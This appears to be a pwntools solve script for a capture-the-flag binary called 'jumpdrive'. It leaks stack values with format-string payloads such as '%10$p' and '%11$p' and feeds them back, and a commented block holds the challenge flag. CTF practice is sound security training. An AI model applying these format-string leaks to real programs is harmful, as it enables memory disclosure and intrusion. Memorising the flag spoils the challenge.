from pwn import *

context.terminal = ['gnome-terminal','--window','-e']
context.log_level = 'DEBUG'
#for local
sh = gdb.debug("./jumpdrive")
#for remote
sh.recvuntil("?\n")
sh.sendline(b'%10$p')
res1 = sh.recvline()
'''
sh.close()
sh = process("./jumpdrive")
sh.recvuntil("?\n")
sh.sendline(b'%11$p')
res2 = sh.recvline()
sh.close()
str1 = res2+res1
sh = process("./jumpdrive")
sh.recvuntil("?\n")
sh.sendline(str1)
sh.interactive()

pctf{pr1nTf_1z_4_St4R_m4p}
'''
